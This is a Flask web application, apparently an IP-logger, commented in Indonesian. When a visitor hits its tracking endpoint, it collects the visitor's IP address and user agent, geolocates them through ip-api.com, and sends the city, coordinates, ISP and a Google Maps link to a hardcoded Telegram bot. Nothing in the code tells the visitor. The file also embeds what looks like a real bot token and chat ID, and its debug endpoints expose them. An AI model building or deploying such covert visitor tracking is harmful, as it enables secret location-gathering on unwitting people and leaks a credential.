from flask import Flask, render_template, request, jsonify
import requests
import os
from datetime import datetime

app = Flask(__name__, 
            template_folder='../templates',
            static_folder='../static')

# ============ KONFIGURASI ============
# 🔴 SEMENTARA: Hardcode untuk testing (JANGAN UNTUK PRODUKSI!)
TELEGRAM_BOT_TOKEN = "8780073514:AAF4WU_A69EitrlCxx155yNxCwwHz41M__s"  # GANTI SEGERA!
TELEGRAM_CHAT_ID = "6446678808"

# ============ FUNCTIONS ============

def get_client_ip():
    headers_to_check = [
        'CF-Connecting-IP',
        'X-Vercel-Forwarded-For',
        'X-Forwarded-For',
        'X-Real-IP',
        'True-Client-IP',
    ]
    
    for header in headers_to_check:
        ip = request.headers.get(header)
        if ip:
            ip = ip.split(',')[0].strip()
            if ip and not ip.startswith(('127.', '10.', '192.168.', '172.', '::1')):
                return ip
    
    return request.remote_addr

def get_ip_info(ip):
    try:
        url = f'http://ip-api.com/json/{ip}' if ip else 'http://ip-api.com/json/'
        fields = 'status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query'
        response = requests.get(f'{url}?fields={fields}', timeout=10)
        return response.json()
    except Exception as e:
        return {"status": "error", "message": str(e), "query": ip}

def send_to_telegram(data):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("[ERROR] Token atau Chat ID kosong!")
        return False
    
    def safe(key, default='N/A'):
        val = data.get(key)
        return str(val) if val else default
    
    ip_addr   = safe('query')
    country   = safe('country')
    region    = safe('regionName')
    city      = safe('city')
    lat       = safe('lat')
    lon       = safe('lon')
    isp       = safe('isp')
    org       = safe('org')
    timezone  = safe('timezone')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    ua        = safe('user_agent', 'Unknown')[:200]
    
    maps_link = ""
    if lat != 'N/A' and lon != 'N/A' and lat != '' and lon != '':
        try:
            float(lat)
            maps_link = f"\n\n🗺 Google Maps: https://www.google.com/maps?q={lat},{lon}"
        except:
            pass
    
    # Kirim dengan format sederhana dulu untuk test
    message = f"""🔴 NEW VISITOR

📅 Time: {timestamp}
🌐 IP: {ip_addr}
📍 Location: {city}, {region}, {country}
📡 ISP: {isp}
🕐 Timezone: {timezone}

📱 User Agent: {ua}{maps_link}"""
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': None,  # Pakai None dulu untuk test
        'disable_web_page_preview': True
    }
    
    try:
        print(f"[DEBUG] Sending to Telegram...")
        response = requests.post(url, json=payload, timeout=15)
        result = response.json()
        
        print(f"[DEBUG] Response: {result}")
        
        if result.get('ok'):
            print("[SUCCESS] Terkirim ke Telegram!")
            return True
        else:
            print(f"[ERROR] Telegram: {result.get('description')}")
            return False
            
    except Exception as e:
        print(f"[ERROR] Exception: {e}")
        return False

# ============ ROUTES ============

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/favicon.ico')
def favicon():
    return '', 204

@app.route('/api/track', methods=['GET', 'POST'])
def track():
    print("=" * 50)
    print("TRACKING REQUEST RECEIVED")
    
    client_ip = get_client_ip()
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referer = request.headers.get('Referer', 'Direct')
    
    print(f"IP: {client_ip}")
    print(f"User-Agent: {user_agent}")
    
    ip_info = get_ip_info(client_ip)
    ip_info['user_agent'] = user_agent
    ip_info['timestamp'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    ip_info['detected_ip'] = client_ip
    ip_info['referer'] = referer
    
    print(f"IP Info status: {ip_info.get('status')}")
    
    telegram_sent = send_to_telegram(ip_info)
    ip_info['telegram_sent'] = telegram_sent
    
    print(f"Telegram sent: {telegram_sent}")
    print("=" * 50)
    
    return jsonify(ip_info)

@app.route('/api/test-telegram', methods=['GET'])
def test_telegram():
    """Test endpoint untuk debugging"""
    print("TEST TELEGRAM ENDPOINT CALLED")
    
    test_data = {
        'query': '8.8.8.8',
        'country': 'United States',
        'regionName': 'California',
        'city': 'Mountain View',
        'lat': '37.4056',
        'lon': '-122.0775',
        'isp': 'Google LLC',
        'org': 'Google Public DNS',
        'timezone': 'America/Los_Angeles',
        'user_agent': 'Test Agent from Vercel'
    }
    
    sent = send_to_telegram(test_data)
    
    return jsonify({
        'test_message_sent': sent,
        'token_ada': bool(TELEGRAM_BOT_TOKEN),
        'chat_id_ada': bool(TELEGRAM_CHAT_ID),
        'token_preview': TELEGRAM_BOT_TOKEN[:10] + '...' if TELEGRAM_BOT_TOKEN else 'None',
        'chat_id': TELEGRAM_CHAT_ID
    })

@app.route('/api/debug', methods=['GET'])
def debug():
    """Endpoint debugging untuk cek konfigurasi"""
    return jsonify({
        'telegram_token_set': bool(TELEGRAM_BOT_TOKEN),
        'telegram_chat_id_set': bool(TELEGRAM_CHAT_ID),
        'token_length': len(TELEGRAM_BOT_TOKEN) if TELEGRAM_BOT_TOKEN else 0,
        'chat_id': TELEGRAM_CHAT_ID,
        'python_version': '3.x'
    })

# Untuk running lokal
if __name__ == '__main__':
    app.run(debug=True, port=5000)
